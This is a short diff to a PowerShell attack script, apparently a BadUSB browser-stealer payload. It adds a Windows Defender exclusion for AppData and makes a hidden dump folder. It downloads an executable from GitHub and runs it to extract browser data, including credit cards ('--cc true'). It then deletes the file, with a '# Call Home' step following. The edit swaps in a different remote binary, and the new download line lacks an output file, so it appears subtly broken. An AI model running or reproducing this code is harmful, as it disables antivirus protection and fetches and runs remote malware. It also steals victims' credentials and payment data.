@@ -4,9 +4,9 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
 #Downloading and executing b.exe
-Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe' -OutFile "b.exe"
-.\b.exe --format json --cc true --dir .
-Remove-Item -Path "$env:appdata\Microsoft\dump\b.exe" -Force
+Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b32.exe'
+.\b32.exe --format json --cc true --dir .
+Remove-Item -Path "$env:appdata\Microsoft\dump\b32.exe" -Force
 $Random = Get-Random
 
 # Call Home
